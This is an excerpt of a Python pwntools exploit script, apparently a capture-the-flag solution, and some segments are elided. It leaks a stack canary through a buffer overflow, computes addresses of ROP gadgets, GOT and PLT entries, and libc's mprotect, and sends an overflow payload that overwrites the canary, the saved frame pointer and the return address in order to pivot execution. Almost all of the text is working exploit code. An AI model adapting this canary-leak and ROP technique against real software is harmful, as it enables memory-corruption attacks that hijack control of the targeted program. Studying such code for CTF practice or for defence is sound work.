...
# gdb.attach(p)
# pause()
p.recvuntil("Enter your favorite sentence:\n")
p.sendline("B"*0x48)
p.recvuntil("B"*0x48)
canary = u64(p.recv(8)) - 0xa
pr('canary',canary)

read_got = codebase + 0x201fc0 #elf.got['read'] #0x201FC0
puts_plt = codebase + 0x960 #elf.plt['puts']
retn = codebase + 0x916
leave_ret = codebase + 0xbb7 #leave; ret
magic_addr = codebase + 0xade #add    DWORD PTR [ebp-0x3d], ebx
prdi_ret = codebase + 0xd63 #pop rdi ; ret

csu_init_gadget2 = codebase + 0xd5a
''' rsp+
pop rbx
pop rbp
pop r12
...
retn
'''
csu_init_gadget1 = codebase + 0xd40
'''
mov rdx, r15
mov rsi, r14
mov edi, r13d
...
read_main = codebase + 0xccc

# gdb.attach(p)
# pause()
payload = 'C'*0x48 + p64(canary) + p64(fake_rbp) + p64(read_main)
p.send(payload)
...
prsi_ret = libcbase + 0x2601f  # pop rsi ; ret
prdx_ret = libcbase + 0x15f8c6 # pop rdx ; pop rbx ; ret
mprotect = libcbase + 0x1189a0 #__mprotect
